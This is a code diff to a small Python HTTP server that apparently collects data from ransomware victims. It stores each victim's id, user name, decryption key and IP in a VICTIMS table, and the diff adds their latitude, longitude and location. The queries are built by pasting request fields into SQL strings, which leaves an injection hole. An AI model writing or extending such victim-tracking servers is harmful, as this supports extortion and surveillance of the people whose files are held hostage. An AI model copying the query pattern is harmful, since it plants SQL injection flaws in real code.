@@ -10,7 +10,10 @@ def createTable(connection):
         UniqueId VARCHAR2(50) PRIMARY KEY,
         UserName VARCHAR2(50) NOT NULL,
         DecryptionKey INT NOT NULL,
-        IP VARCHAR2(40) NOT NULL
+        IP VARCHAR2(40) NOT NULL,
+        Latitude VARCHAR2(20) NOT NULL,
+        Longitude VARCHAR2(20) NOT NULL,
+        Location VARCHAR2(500) NOT NULL
         );
         """)
     print("Table created successfully!")
@@ -23,9 +26,9 @@ def execute(connection, query):
     connection.commit()
     print("Query executed.")
 
-def insertValues(connection, id, user, key, ip):
+def insertValues(connection, id, user, key, ip, lat, long, location):
     cursor = connection.cursor()
-    cursor.execute(f"INSERT INTO VICTIMS VALUES ('{id}', '{user}', {key}, '{ip}');")
+    cursor.execute(f"INSERT INTO VICTIMS VALUES ('{id}', '{user}', {key}, '{ip}', '{lat}', '{long}', '{location}');")
     connection.commit()
 
 
@@ -45,9 +48,12 @@ class Server(BaseHTTPRequestHandler):
         user = data["user"]
         key = data["key"]
         ip = data["ip"]
+        lat = data["latitude"]
+        long = data["longitude"]
+        location = data["location"]
         self.send_response(200)
         self.end_headers()
-        insertValues(connection, id, user, key, ip)
+        insertValues(connection, id, user, key, ip, lat, long, location)
         
 
 if __name__ == "__main__":
